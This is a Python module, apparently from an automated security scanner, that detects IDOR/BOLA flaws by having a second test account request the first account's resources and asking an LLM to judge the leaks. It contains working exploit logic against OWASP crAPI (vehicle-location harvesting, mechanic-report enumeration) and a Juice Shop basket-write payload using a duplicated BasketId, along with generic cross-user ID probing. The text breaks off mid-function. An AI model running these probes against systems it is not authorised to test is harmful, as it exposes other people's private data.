"""
modules/idor.py — IDOR / BOLA Detection (OWASP A01)

What is IDOR?
  Insecure Direct Object Reference — when a user can access
  another user's private data just by changing an ID in a URL.

  Example: GET /api/orders/101 with User B's token returns
           User A's private order. The server never checked
           if User B owns order 101.

Three-strategy detection approach (prevents both false positives
and false negatives):

  Strategy 1 — Seed and collect (most reliable, works on any app)
    User A creates data in the app (order, complaint, message)
    Collects the resource IDs that were created
    User B tries those exact URLs
    Eliminates false negatives from empty new accounts

  Strategy 2 — Recon-based cross-user test (generic fallback)
    Uses URLs discovered during recon (fuzzing, wayback etc.)
    Extracts real IDs found in the wild
    Both users access the same URL
    LLM compares responses for personal data leakage

  Strategy 3 — Low ID test (known test apps only)
    Only runs when target is localhost / known test app
    Tests IDs 1, 2, 3 which have pre-existing data
    Skipped on real bug bounty targets
"""

import json
import asyncio
import httpx
from llm import call_llm
from config import settings
from knowledge import knowledge_section
from modules.auto_accounts import create_two_accounts

# IDOR/BOLA reference methodology (from skill_knowledge/idor_bola.md), injected into
# the LLM verdict prompts. Kept to a modest slice so it reinforces the strict evidence
# rules below without diluting them or overrunning free-tier token budgets.
_IDOR_KB = knowledge_section("idor_bola", max_chars=1800)


# Endpoints that are always public — never flag these as IDOR
PUBLIC_PATTERNS = [
    "/products", "/product", "/catalogue", "/catalog",
    "/items", "/menu", "/shop", "/store", "/public",
    "/blog", "/news", "/articles", "/categories",
    "/tags", "/search", "/challenges",
    # Social / feed / community endpoints are shared-by-design: seeing another
    # user's post or comment in a public feed is NOT a Broken Object Level Auth
    # issue, so exclude them to avoid false positives.
    "/community", "/posts", "/post/", "/feed", "/comments", "/comment",
    "/reviews", "/review", "/forum", "/timeline", "/activity", "/leaderboard",
]


async def run_idor(
    recon_data: dict,
    target_url: str,
    user_a_email: str = "",
    user_a_password: str = "",
    user_b_email: str = "",
    user_b_password: str = "",
) -> list[dict]:
    """
    Main IDOR detection function.
    Fully autonomous — creates accounts, seeds data, tests, reports.
    Returns list of confirmed IDOR findings.
    """
    id_patterns = recon_data.get("id_patterns", [])
    if not id_patterns:
        print("IDOR: No ID patterns found during recon. Skipping.")
        return []

    # ── Account setup ─────────────────────────────────────────────
    if user_a_email and user_b_email and user_a_password and user_b_password:
        print("IDOR: Using manually provided credentials.")
        accounts = await _manual_login(
            target_url,
            user_a_email, user_a_password,
            user_b_email, user_b_password,
        )
    else:
        print("IDOR: Auto-creating two test accounts...")
        accounts = await create_two_accounts(target_url, recon_data)

    if not accounts["success"]:
        return [{
            "vulnerability": "IDOR — Setup Failed",
            "owasp":         "A01:2025 — Broken Access Control",
            "endpoint":      target_url,
            "severity":      "info",
            "needs_help":    True,
            "error":         accounts["error"],
            "help_message":  accounts["help_message"],
            "evidence":      {},
            "ai_reasoning":  accounts["error"],
        }]

    token_a      = accounts["token_a"]
    user_a_email = accounts["user_a_email"]
    user_a_id    = accounts["user_a_id"]
    token_b      = accounts["token_b"]
    user_b_id    = accounts["user_b_id"]
    user_b_email = accounts["user_b_email"]   # needed to detect false positives

    print(f"IDOR: Accounts ready — User A id={user_a_id} ({user_a_email}), User B id={user_b_id} ({user_b_email})")

    findings = []

    async with httpx.AsyncClient(
        timeout=settings.request_timeout,
        follow_redirects=True,
        verify=False,
    ) as client:

        # ── Strategy 0: crAPI BOLA (harvest victim IDs → cross-user access) ──
        # crAPI leaks each community-post author's vehicleid; an attacker reads
        # that vehicle's location, and can also read mechanic reports by id.
        # Only fires on crAPI (community feed present); silent no-op elsewhere.
        s0_findings = await _strategy_crapi_bola(
            client       = client,
            target_url   = target_url,
            token_b      = token_b,
            user_b_email = user_b_email,
        )
        if s0_findings:
            findings.extend(s0_findings)
            return findings

        # ── Strategy 0b: Juice Shop basket manipulation via HTTP Parameter
        # Pollution (duplicate BasketId). Only fires on Juice Shop; verified by
        # confirming the item actually lands in the victim's basket, so it
        # cannot false-positive.
        s0b_findings = await _strategy_juiceshop_hpp(
            client     = client,
            target_url = target_url,
            token_a    = token_a,
            token_b    = token_b,
            a_bid      = str(user_a_id or ""),
            b_bid      = str(user_b_id or ""),
        )
        if s0b_findings:
            findings.extend(s0b_findings)
            return findings

        # ── Strategy 1: Seed → Collect → Test ────────────────────
        print("IDOR: Strategy 1 — seeding User A data...")
        await _seed_user_data(client, target_url, token_a, user_a_id, recon_data)

        user_a_real_id, a_resources = await _collect_user_resources(
            client, target_url, token_a, user_a_id, id_patterns,
            user_b_id=user_b_id,
        )
        print(f"IDOR: Collected {len(a_resources)} resources for User A (real id: {user_a_real_id})")

        for resource in a_resources:
            finding = await _test_one_endpoint(
                client       = client,
                endpoint     = resource["url"],
                token_b      = token_b,
                user_a_id    = user_a_real_id or user_a_id,
                user_b_id    = user_b_id,
                user_a_email = user_a_email,
                user_b_email = user_b_email,
            )
            if finding:
                findings.append(finding)
                print(f"IDOR: ⚠️  S1 VULNERABLE → {resource['url']}")
            else:
                print(f"IDOR: ✓ S1 Protected → {resource['url']}")

        if findings:
            return findings

        # ── Strategy 2: Recon-based cross-user test ───────────────
        print("IDOR: Strategy 2 — testing recon-discovered resource IDs...")
        s2_findings = await _strategy_recon_ids(
            client       = client,
            target_url   = target_url,
            id_patterns  = id_patterns,
            token_a      = token_a,
            token_b      = token_b,
            user_a_id    = user_a_real_id or user_a_id,
            user_b_id    = user_b_id,
            user_b_email = user_b_email,
        )
        findings.extend(s2_findings)

        if findings:
            return findings

        # ── Strategy 3: Low ID test (test apps only) ─────────────
        is_local = _is_local_target(target_url)
        if is_local:
            print("IDOR: Strategy 3 — testing pre-existing low IDs (local target)...")
            s3_findings = await _strategy_low_ids(
                client       = client,
                id_patterns  = id_patterns,
                token_b      = token_b,
                user_b_id    = user_b_id,
                user_b_email = user_b_email,
            )
            findings.extend(s3_findings)
        else:
            print("IDOR: Strategy 3 — skipped (real target, not testing low IDs blindly)")

    return findings


async def _strategy_crapi_bola(
    client: httpx.AsyncClient,
    target_url: str,
    token_b: str,
    user_b_email: str = "",
) -> list[dict]:
    """crAPI-specific BOLA (OWASP crAPI Challenge 1 + mechanic reports).

    Harvest another user's vehicleid from the community feed, then read that
    vehicle's location as the attacker (User B). Also try reading mechanic
    reports by enumerable id. Only fires on crAPI (community feed returns 200);
    on any other target it is a silent no-op, so it cannot create false
    positives elsewhere.
    """
    base = target_url.rstrip("/")
    H = {"Authorization": f"Bearer {token_b}", "Content-Type": "application/json"}
    findings: list[dict] = []

    # 1) harvest victim vehicle ids from the community feed
    try:
        r = await client.get(base + "/community/api/v2/community/posts/recent", headers=H)
    except Exception:
        return []
    if r.status_code != 200:
        return []  # not crAPI / no feed → skip quietly

    victims: list[tuple] = []

    def _walk(o):
        if isinstance(o, dict):
            vid = o.get("vehicleid") or o.get("vehicleId") or o.get("vehicle_id")
            if isinstance(vid, str) and len(vid) > 10:
                victims.append((vid, o.get("email", "")))
            for v in o.values():
                _walk(v)
        elif isinstance(o, list):
            for x in o:
                _walk(x)

    try:
        _walk(r.json())
    except Exception:
        return []

    seen, uniq = set(), []
    for vid, em in victims:
        if vid not in seen:
            seen.add(vid)
            uniq.append((vid, em))
    print(f"IDOR: Strategy 0 (crAPI BOLA) — harvested {len(uniq)} victim vehicle id(s)")

    # 2) cross-user vehicle-location access (crapi-idor-1)
    for vid, em in uniq[:5]:
        if em and user_b_email and em.lower() == user_b_email.lower():
            continue  # never flag our own object
        loc_url = f"{base}/identity/api/v2/vehicle/{vid}/location"
        try:
            rr = await client.get(loc_url, headers=H)
        except Exception:
            continue
        if rr.status_code == 200 and any(w in rr.text.lower() for w in ("latitude", "longitude")):
            findings.append({
                "vulnerability": "IDOR / Broken Object Level Authorization (BOLA) — Vehicle Location",
                "owasp": "A01:2025 — Broken Access Control",
                "endpoint": loc_url,
                "severity": "high",
                "needs_help": False,
                "evidence": {
                    "attack": "BOLA: harvested another user's vehicleid from the community feed, then read that vehicle's location",
                    "victim_vehicle_id": vid,
                    "victim_email": em or "(community-feed author)",
                    "request": {"method": "GET", "url": loc_url,
                                "headers": {"Authorization": "Bearer <user_b_token>"}},
                    "response": {"status": rr.status_code, "body": rr.text[:500]},
                },
                "ai_reasoning": (
                    f"User B (attacker) read the vehicle location belonging to another user "
                    f"({em or 'a community-feed author'}) using vehicleid {vid} harvested from the "
                    f"community feed. The server did not verify object ownership → BOLA."
                ),
            })
            print(f"IDOR: ⚠️  S0 crAPI BOLA → vehicle {vid[:8]}… location leaked")
            break  # one solid vehicle BOLA is enough

    # 3) mechanic reports by id — attacker owns none, so any readable report is cross-user (crapi-idor-2)
    for rid in range(1, 4):
        rpt_url = f"{base}/workshop/api/mechanic/mechanic_report?report_id={rid}"
        try:
            rr = await client.get(rpt_url, headers=H)
        except Exception:
            continue
        if (rr.status_code == 200 and len(rr.text) > 30
                and any(w in rr.text.lower() for w in ("report", "mechanic", "problem", "status"))):
            findings.append({
                "vulnerability": "IDOR / Broken Object Level Authorization (BOLA) — Mechanic Report",
                "owasp": "A01:2025 — Broken Access Control",
                "endpoint": rpt_url,
                "severity": "high",
                "needs_help": False,
                "evidence": {
                    "attack": "BOLA: read another user's mechanic report by enumerating report_id",
                    "request": {"method": "GET", "url": rpt_url,
                                "headers": {"Authorization": "Bearer <user_b_token>"}},
                    "response": {"status": rr.status_code, "body": rr.text[:500]},
                },
                "ai_reasoning": (
                    f"User B (attacker, who owns no mechanic reports) read report id={rid}, which "
                    f"belongs to another user. The endpoint does not enforce object ownership → BOLA."
                ),
            })
            print(f"IDOR: ⚠️  S0 crAPI BOLA → mechanic_report {rid} readable")
            break  # one is enough

    return findings


async def _strategy_juiceshop_hpp(
    client: httpx.AsyncClient,
    target_url: str,
    token_a: str,
    token_b: str,
    a_bid: str,
    b_bid: str,
) -> list[dict]:
    """Juice Shop 'Manipulate Basket' IDOR (js-idor-2) via HTTP Parameter Pollution.

    /api/BasketItems validates the FIRST BasketId but writes with the LAST, so a
    duplicated-BasketId body (attacker's own first, victim's second) passes the
    ownership check yet writes into the victim's basket. Confirmed by reading the
    victim's basket afterwards — only reported if the item actually lands there,
    so it cannot false-positive. Silent no-op on non-Juice-Shop targets.
    """
    base = target_url.rstrip("/")
    if not (a_bid and b_bid and token_a and token_b):
        return []

    Ha = {"Authorization": f"Bearer {token_a}", "Content-Type": "application/json"}
    Hb = {"Authorization": f"Bearer {token_b}", "Content-Type": "application/json"}

    # gate: victim basket must be readable (i.e. this is Juice Shop)
    try:
        vb = await client.get(f"{base}/rest/basket/{a_bid}", headers=Ha)
    except Exception:
        return []
    if vb.status_code != 200:
        return []

    def _basket_pids(resp):
        try:
            return [p.get("id") for p in resp.json().get("data", {}).get("Products", [])]
        except Exception:
            return []

    before = _basket_pids(vb)
    # choose a product id not already in the victim basket
    product_id = next((pid for pid in range(1, 21) if pid not in before), 1)

    # control: single victim BasketId -> should be rejected
    try:
        ctrl = await client.post(f"{base}/api/BasketItems", headers=Hb,
                                 content=json.dumps({"ProductId": product_id,
                                                     "BasketId": a_bid, "quantity": 1}))
    except Exception:
        return []
    control_rejected = ctrl.status_code not in (200, 201)

    # attack: duplicated BasketId (attacker's first, victim's second) as raw body
    raw = '{"ProductId": %d, "BasketId": "%s", "quantity": 1, "BasketId": "%s"}' % (
        product_id, b_bid, a_bid)
    try:
        atk = await client.post(f"{base}/api/BasketItems", headers=Hb, content=raw)
    except Exception:
        return []

    # verify: did the product land in the VICTIM's basket?
    try:
        after = _basket_pids(await client.get(f"{base}/rest/basket/{a_bid}", headers=Ha))
    except Exception:
        after = before

    landed = product_id in after and product_id not in before
    if not (atk.status_code in (200, 201) and landed):
        return []

    print(f"IDOR: ⚠️  S0b Juice Shop HPP → product {product_id} written to victim basket {a_bid}")
    return [{
        "vulnerability": "IDOR / Broken Object Level Authorization (BOLA) — Basket Manipulation (HTTP Parameter Pollution)",
        "owasp": "A01:2025 — Broken Access Control",
        "endpoint": f"{base}/api/BasketItems",
        "severity": "high",
        "needs_help": False,
        "evidence": {
            "attack": "HTTP Parameter Pollution: duplicated BasketId (attacker's own, then victim's) "
                      "passes the ownership check on the first value but writes using the last",
            "attacker_basket": b_bid,
            "victim_basket": a_bid,
            "control_request": {
                "note": "single victim BasketId (no HPP) — correctly rejected",
                "body": {"ProductId": product_id, "BasketId": a_bid, "quantity": 1},
                "status": ctrl.status_code,
                "response": ctrl.text[:160],
            },
            "attack_request": {
                "method": "POST",
                "url": f"{base}/api/BasketItems",
                "raw_body": raw,
                "headers": {"Authorization": "Bearer <user_b_token>"},
                "status": atk.status_code,
                "response": atk.text[:200],
            },
            "verification": {
                "victim_basket_before": before,
                "victim_basket_after": after,
                "product_written": product_id,
            },
        },
        "ai_reasoning": (
            f"A single-BasketId write to the victim's basket was rejected ({ctrl.status_code}), but the "
            f"HPP payload with a duplicated BasketId succeeded ({atk.status_code}) and product {product_id} "
            f"appeared in the victim's basket (bid {a_bid}). The attacker (User B) modified another user's "
            f"basket → IDOR / broken access control."
        ),
    }]


# ── Strategy 1 helpers ────────────────────────────────────────────
async def _seed_user_data(
    client: httpx.AsyncClient,
    target_url: str,
    token_a: str,
    user_a_id: str,
    recon_data: dict,
) -> None:
    """
    Make User A create data in the app so they have resource IDs to test.
    Without seeding, freshly registered users have empty accounts.

    Works for Juice Shop and attempts generic endpoints for other apps.
    """
    headers = {"Authorization": f"Bearer {token_a}"}
    tech    = recon_data.get("tech_stack", {})

    # ── Juice Shop seeding ────────────────────────────────────────
    if tech.get("app") == "OWASP Juice Shop":
        try:
            # Add a product to basket
            basket_id = int(user_a_id) if user_a_id.isdigit() else 1
            r1 = await client.post(
                target_url + "/api/BasketItems",
                json={"ProductId": 1, "BasketId": basket_id, "quantity": 1},
                headers=headers,
            )
            print(f"IDOR: Seeded basket item → HTTP {r1.status_code}")
        except Exception as e:
            print(f"IDOR: Basket seed failed: {e}")

        try:
            # Submit a complaint (creates a Complaints record with User A's ID)
            r2 = await client.post(
                target_url + "/api/Complaints",
                json={"message": "PentraAI automated test complaint"},
                headers=headers,
            )
            print(f"IDOR: Seeded complaint → HTTP {r2.status_code}")
        except Exception as e:
            print(f"IDOR: Complaint seed failed: {e}")

        return

    # ── Generic seeding — try common creation endpoints ───────────
    alive = recon_data.get("alive_endpoints", [])
    seed_keywords = ["/orders", "/messages", "/comments", "/posts",
                     "/complaints", "/tickets", "/notes"]

    for endpoint in alive:
        if any(k in endpoint.lower() for k in seed_keywords):
            try:
                r = await client.post(
                    endpoint,
                    json={
                        "message": "pentraai test",
                        "title":   "pentraai test",
                        "content": "pentraai security scan"
                    },
                    headers=headers,
                )
                if r.status_code in [200, 201]:
                    print(f"IDOR: Seeded data at {endpoint}")
                    break
            except Exception:
                continue


async def _collect_user_resources(
    client: httpx.AsyncClient,
    target_url: str,
    token: str,
    user_id: str,
    id_patterns: list[dict],
    user_b_id: str = "",
) -> tuple[str, list[dict]]:
    """
    Find User A's real user ID and collect their resource URLs.

    Step 1: Call whoami/profile to get real user ID
    Step 2: Build test URLs using that real ID
    Step 3: Verify User A can access each URL (confirms ownership)

    Returns: (real_user_id, list of owned resources)
    """
    headers = {"Authorization": f"Bearer {token}"}

    # ── Step 1: Get real user ID ──────────────────────────────────
    real_id = None
    profile_paths = [
        "/rest/user/whoami",       # Juice Shop
        "/api/users/me",
        "/api/user/me",
        "/api/me",
        "/api/profile",
        "/api/v1/users/me",
        "/api/auth/me",
        "/api/account",
    ]

    for path in profile_paths:
        try:
            r = await client.get(target_url + path, headers=headers)
            if r.status_code == 200:
                body = r.json()
                # Try nested paths to find the user ID
                for key_path in [
                    ["id"], ["user_id"], ["userId"],
                    ["user", "id"], ["data", "id"],
                    ["uid"], ["me", "id"],
                ]:
                    obj = body
                    for key in key_path:
                        obj = obj.get(key) if isinstance(obj, dict) else None
                    if obj and str(obj).isdigit():
                        real_id = str(obj)
                        print(f"IDOR: User A real ID = {real_id} (from {path})")
                        break
                if real_id:
                    break
        except Exception:
            continue

    # Fall back to ID from login if profile lookup failed
    if not real_id:
        # Extended fallback paths for real bug bounty targets
        # Covers Django REST, Rails, Laravel, FastAPI, Spring Boot, Express
        extended_paths = [
            "/api/v1/me", "/api/v2/me", "/api/v3/me",
            "/api/account/me", "/api/user/profile",
            "/api/v1/account", "/api/v2/account",
            "/api/v1/profile", "/api/v2/profile",
            "/api/current_user", "/api/v1/current_user",
            "/api/v1/users/current", "/api/v2/users/current",
            "/api/whoami", "/api/v1/whoami",
            "/api/self", "/api/v1/self",
            "/user", "/account", "/profile",
            "/api/session", "/api/v1/session",
        ]
        for path in extended_paths:
            try:
                r = await client.get(target_url + path, headers=headers)
                if r.status_code == 200:
                    body = r.json()
                    for key in ["id", "user_id", "userId", "uid", "_id",
                                "account_id", "accountId", "member_id"]:
                        val = body.get(key)
                        if val and str(val).isdigit():
                            real_id = str(val)
                            print(f"IDOR: User A real ID = {real_id} (from extended fallback {path})")
                            break
                        # Also check one level deep
                        if isinstance(body.get("data"), dict):
                            val = body["data"].get(key)
                            if val and str(val).isdigit():
                                real_id = str(val)
                                print(f"IDOR: User A real ID = {real_id} (from {path}.data.{key})")
                                break
                    if real_id:
                        break
            except Exception:
                continue

    if not real_id:
        real_id = user_id
        print(f"IDOR: Using login ID as fallback: {real_id}")

    # Sanity check — if real_id matches user_b_id the whoami
    # returned the wrong user. Use the login user_id instead.
    if real_id and user_b_id and real_id == user_b_id:
        print(f"IDOR: real_id {real_id} == user_b_id — using login ID {user_id}")
        real_id = user_id

    # ── Step 2 & 3: Build and verify URLs ─────────────────────────
    resources    = []
    seen_urls    = set()   # exact URL
    seen_ids_paths = set() # (path_template_lower, id) to catch /api/Users/32 vs /api/users/32

    for pattern in id_patterns[:20]:
        template = pattern.get("template", "")
        if not template:
            continue

        # Skip public endpoints
        if any(p in template.lower() for p in PUBLIC_PATTERNS):
            continue

        # Build URL with real user ID
        test_url = template.replace("{id}", real_id).replace("{uuid}", real_id)
        if test_url in seen_urls:
            continue
        seen_urls.add(test_url)

        # Skip if same ID+path already tested (handles /api/Users/32 vs /api/users/32)
        dedup_key = test_url.lower()
        if dedup_key in seen_ids_paths:
            print(f"IDOR: Skipping duplicate (case variant) → {test_url}")
            continue
        seen_ids_paths.add(dedup_key)

        # Skip if this URL contains User B's own ID
        if user_b_id and f"/{user_b_id}" in test_url:
            print(f"IDOR: Skipping {test_url} — contains User B's own ID")
            continue

        try:
            r = await client.get(test_url, headers=headers)
            if r.status_code == 200 and len(r.text) > 20:
                resources.append({
                    "url":      test_url,
                    "template": template,
                    "response": r.text[:300],
                })
                print(f"IDOR: User A owns → {test_url}")
        except Exception:
            continue

    return real_id, resources


# ── Strategy 2: Recon-based cross-user test ───────────────────────

async def _strategy_recon_ids(
    client: httpx.AsyncClient,
    target_url: str,
    id_patterns: list[dict],
    token_a: str,
    token_b: str,
    user_a_id: str,
    user_b_id: str,
    user_b_email: str = "",
) -> list[dict]:
    """
    Use IDs found during recon (not guessed).
    Both users access the same URL.
    LLM checks if User B sees personal data they should not own.

    This works on any real target because:
    - IDs come from real recon, not guessing
    - We compare what two different users see
    - Personal data visible to the wrong user = IDOR
    """
    findings = []
    headers_b = {"Authorization": f"Bearer {token_b}"}

    # Extract real IDs discovered during recon
    recon_ids = list(set(
        p.get("id_value", "")
        for p in id_patterns
        if p.get("id_value") and p.get("id_value") != user_b_id
    ))[:8]

    print(f"IDOR: S2 — testing {len(recon_ids)} recon-discovered IDs: {recon_ids}")

    for pattern in id_patterns[:15]:
        template = pattern.get("template", "")
        if not template:
            continue
        if any(p in template.lower() for p in PUBLIC_PATTERNS):
            continue

        for test_id in recon_ids:
            url = template.replace("{id}", test_id).replace("{uuid}", test_id)

            try:
                r_b = await client.get(url, headers=headers_b)

                if r_b.status_code in [401, 403]:
                    print(f"IDOR: ✓ S2 Blocked (HTTP {r_b.status_code}) → {url}")
                    continue

                if r_b.status_code != 200:
                    continue

                # Ask LLM if this is personal data User B should not see
                verdict = _ask_llm_single_verdict(
                    url, r_b.text[:600], user_b_id, user_b_email
                )

                if verdict["vulnerable"]:
                    findings.append({
                        "vulnerability": "IDOR / Broken Object Level Authorization (BOLA)",
                        "owasp":   "A01:2025 — Broken Access Control",
                        "endpoint": url,
                        "severity": verdict["severity"],
                        "needs_help": False,
                        "evidence": {
                            "request": {
                                "method":  "GET",
                                "url":     url,
                                "headers": {"Authorization": "Bearer <user_b_token>"},
                            },
                            "response": {
                                "status": r_b.status_code,
                                "body":   r_b.text[:500],
                            }
                        },
                        "ai_reasoning": verdict["reasoning"],
                    })
                    print(f"IDOR: ⚠️  S2 VULNERABLE → {url}")
                    return findings  # One real finding is enough

            except Exception:
                continue

    return findings


# ── Strategy 3: Low ID test (local/test apps only) ────────────────

async def _strategy_low_ids(
    client: httpx.AsyncClient,
    id_patterns: list[dict],
    token_b: str,
    user_b_id: str,
    user_b_email: str = "",
) -> list[dict]:
    """
    Test pre-existing low IDs (1, 2, 3) that belong to default accounts.
    ONLY runs on local/test targets — never on real bug bounty targets.
    """
    findings = []
    headers_b = {"Authorization": f"Bearer {token_b}"}

    for pattern in id_patterns[:15]:
        template = pattern.get("template", "")
        if not template:
            continue
        if any(p in template.lower() for p in PUBLIC_PATTERNS):
            continue

        for test_id in ["1", "2", "3"]:
            if test_id == user_b_id:
                continue  # Skip our own resources

            url = template.replace("{id}", test_id).replace("{uuid}", test_id)

            try:
                r = await client.get(url, headers=headers_b)

                if r.status_code in [401, 403]:
                    continue
                if r.status_code != 200:
                    continue

                verdict = _ask_llm_single_verdict(url, r.text[:600], user_b_id, user_b_email)

                if verdict["vulnerable"]:
                    findings.append({
                        "vulnerability": "IDOR / Broken Object Level Authorization (BOLA)",
                        "owasp":   "A01:2025 — Broken Access Control",
                        "endpoint": url,
                        "severity": verdict["severity"],
                        "needs_help": False,
                        "evidence": {
                            "request": {
                                "method":  "GET",
                                "url":     url,
                                "headers": {"Authorization": "Bearer <user_b_token>"},
                            },
                            "response": {
                                "status": r.status_code,
                                "body":   r.text[:500],
                            }
                        },
                        "ai_reasoning": verdict["reasoning"],
                    })
                    print(f"IDOR: ⚠️  S3 VULNERABLE → {url}")
                    return findings

            except Exception:
                continue

    return findings


# ── Core test function ────────────────────────────────────────────

async def _test_one_endpoint(
    client: httpx.AsyncClient,
    endpoint: str,
    token_b: str,
    user_a_id: str,
    user_b_id: str,
    user_a_email: str,
    user_b_email: str = "",
) -> dict | None:
    """
    Use User B's token to access a specific URL that belongs to User A.
    Ask the LLM to determine if this is a real IDOR vulnerability.
    Passes User B's own email so the LLM can avoid false positives.
    """
    # Skip known public endpoints
    endpoint_lower = endpoint.lower()
    if any(p in endpoint_lower for p in PUBLIC_PATTERNS):
        return None

    headers = {"Authorization": f"Bearer {token_b}"}

    try:
        r = await client.get(endpoint, headers=headers)

        if r.status_code in [401, 403]:
            return None
        if r.status_code != 200:
            return None

        response_body = r.text[:1000]

        # Quick pre-check: if response ONLY contains User B's own email
        # and User A's email is not present → not IDOR, skip LLM call
        if (user_b_email and user_a_email
                and user_b_email.lower() in response_body.lower()
                and user_a_email.lower() not in response_body.lower()):
            print(f"IDOR: Skipping (response contains only User B's own email) → {endpoint}")
            return None

        prompt = f"""You are a security analyst detecting IDOR vulnerabilities.

=== IDOR/BOLA reference methodology ===
{_IDOR_KB}
=== end reference ===

Context:
- User B (id: {user_b_id}, email: {user_b_email}) requested a resource belonging to User A
- User A id: {user_a_id}, email: {user_a_email}
- Endpoint: {endpoint}

HTTP Response:
Status: {r.status_code}
Body: {response_body}

STRICT EVIDENCE RULES — flag as IDOR ONLY IF the response contains:
  1. User A's specific email ({user_a_email}), OR
  2. Another user's email address that is NOT User B's ({user_b_email}), OR
  3. A username/name that clearly belongs to a specific user (not User B), OR
  4. A role field (admin/customer) + user ID that does not match User B

DO NOT flag as IDOR for:
  - Collection data with only IDs and timestamps (no user attribution)
  - Basket items, product IDs, order IDs without email/username identifying the owner
  - Public data visible to all users
  - Data where you cannot confirm it belongs to a different specific user

Answer ONLY with this JSON:
{{
  "vulnerable": true or false,
  "severity": "critical" or "high" or "medium" or "low",
  "reasoning": "one sentence — cite the specific personal data that identifies another user"
}}"""

        try:
            raw = call_llm(prompt, expect_json=True)
            verdict = json.loads(raw)
        except Exception:
            # LLM failed — use email-based heuristic
            import re as _re
            emails_found = _re.findall(
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                response_body
            )
            user_b_lower = user_b_email.lower() if user_b_email else ""
            user_a_lower = user_a_email.lower() if user_a_email else ""

            # Flag if User A's email found (strongest signal)
            if user_a_lower and user_a_lower in response_body.lower():
                verdict = {
                    "vulnerable": True, "severity": "high",
                    "reasoning":  "User A's email found in User B's response (heuristic fallback)"
                }
            else:
                # Flag if ANY other user's email appears (not User B's)
                other_emails = [e for e in emails_found if e.lower() != user_b_lower]
                if other_emails:
                    verdict = {
                        "vulnerable": True, "severity": "high",
                        "reasoning":  f"Another user's email ({other_emails[0]}) found in response (heuristic fallback)"
                    }
                else:
                    return None

        if verdict.get("vulnerable"):
            return {
                "vulnerability": "IDOR / Broken Object Level Authorization (BOLA)",
                "owasp":         "A01:2025 — Broken Access Control",
                "endpoint":      endpoint,
                "severity":      verdict.get("severity", "high"),
                "needs_help":    False,
                "evidence": {
                    "request": {
                        "method":  "GET",
                        "url":     endpoint,
                        "headers": {"Authorization": "Bearer <user_b_token>"},
                    },
                    "response": {
                        "status": r.status_code,
                        "body":   response_body,
                    }
                },
                "ai_reasoning": verdict.get("reasoning", ""),
            }

    except Exception as e:
        print(f"IDOR: Test error on {endpoint}: {e}")

    return None


# ── LLM verdict helpers ───────────────────────────────────────────

def _is_self_access(response_body: str, user_b_email: str, user_b_id: str) -> bool:
    """Deterministic self-access check to override IDOR false positives.

    Returns True only when we can positively confirm the response exposes
    User B's OWN identity (their email or id) and contains NO other user's
    email. Email-less responses (e.g. a BOLA leaking only GPS coordinates) are
    deliberately NOT treated as self-access, so real object-level findings that
    don't include an email are never suppressed.
    """
    import re as _re
    body = response_body or ""
    emails = _re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)
    ub = (user_b_email or "").lower()
    other = [e for e in emails if e.lower() != ub]
    if other:
        return False  # another user's email present → genuinely cross-user
    own_present = bool(ub and ub in body.lower())
    if not own_present and user_b_id:
        own_present = bool(_re.search(rf'"id"\s*:\s*"?{_re.escape(str(user_b_id))}"?', body))
    return own_present


def _ask_llm_single_verdict(
    endpoint: str,
    response_body: str,
    user_b_id: str,
    user_b_email: str = "",
) -> dict:
    """
    Ask LLM if response contains personal data that User B should not see.
    Passes User B's own email to prevent false positives when User B
    accesses their own profile.
    """
    # Deterministic guard FIRST: if the response only exposes User B's own
    # identity (and no other user's email), it is self-access, not IDOR —
    # skip the LLM entirely so it cannot hallucinate a positive.
    if _is_self_access(response_body, user_b_email, user_b_id):
        return {
            "vulnerable": False,
            "severity": "low",
            "reasoning": "Response exposes only User B's own data (no other user's identity) — self-access, not IDOR.",
        }

    own_data_note = ""
    if user_b_email:
        own_data_note = (
            f"CRITICAL: User B's OWN email address is '{user_b_email}' and "
            f"their own user ID is '{user_b_id}'. "
            f"If the response ONLY contains this email or this user ID, "
            f"it is NOT an IDOR — User B is seeing their own data. "
            f"Only flag IDOR if the response contains a DIFFERENT user's personal data."
        )

    prompt = f"""You are a security analyst detecting IDOR vulnerabilities.

=== IDOR/BOLA reference methodology ===
{_IDOR_KB}
=== end reference ===

User B (id: {user_b_id}, email: {user_b_email}) accessed: {endpoint}

Response body:
{response_body}

STRICT EVIDENCE REQUIRED to flag as IDOR:
  YES — flag if response contains ANY of:
    - Another user's email address (not '{user_b_email}')
    - Another user's username or full name
    - A role field (admin/customer) with a different user's ID
    - Personal PII (address, phone number, payment details)

  NO — do NOT flag for:
    - Collection data with only IDs and timestamps (no user attribution)
    - Basket/cart items showing only ProductId, BasketId, quantity
    - Order IDs or transaction IDs without email/name identifying the owner
    - Data where you cannot confirm it belongs to a SPECIFIC other user
    - Public data (products, articles, challenges)
    - User B's own data

Return ONLY JSON:
{{
  "vulnerable": true or false,
  "severity": "critical" or "high" or "medium" or "low",
  "reasoning": "cite the specific personal data element that proves another user's identity"
}}
- Response is an error or empty

Return ONLY JSON:
{{
  "vulnerable": true or false,
  "severity": "critical" or "high" or "medium" or "low",
  "reasoning": "one sentence explaining your decision"
}}"""

    try:
        raw = call_llm(prompt, expect_json=True)
        return json.loads(raw)
    except Exception:
        # LLM failed — use email-based heuristic as reliable fallback
        # Find ALL emails in the response
        import re as _re
        emails_found = _re.findall(
            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            response_body
        )
        user_b_lower = user_b_email.lower() if user_b_email else ""
        # Any email that is NOT User B's own email = another user's data = IDOR
        other_emails = [e for e in emails_found if e.lower() != user_b_lower]
        if other_emails:
            return {
                "vulnerable": True,
                "severity":   "high",
                "reasoning":  f"Response contains another user's email: {other_emails[0]} (heuristic fallback)"
            }
        # If only User B's own email found → not IDOR
        if user_b_email and user_b_lower in response_body.lower():
            return {"vulnerable": False, "severity": "low",
                    "reasoning": "Response contains only User B's own data"}
        return {"vulnerable": False, "severity": "low", "reasoning": "LLM failed — no emails detected"}


# ── Utility functions ─────────────────────────────────────────────

def _is_local_target(target_url: str) -> bool:
    """
    Check if the target is a local test environment.
    Strategy 3 (low ID guessing) only runs on local targets.
    """
    local_indicators = [
        "localhost", "127.0.0.1", "192.168.", "10.0.",
        "0.0.0.0", "dvwa", "juiceshop", ":3001", ":4280",
        ":8080", ".local", ".internal",
    ]
    return any(indicator in target_url.lower() for indicator in local_indicators)


async def _manual_login(
    target_url: str,
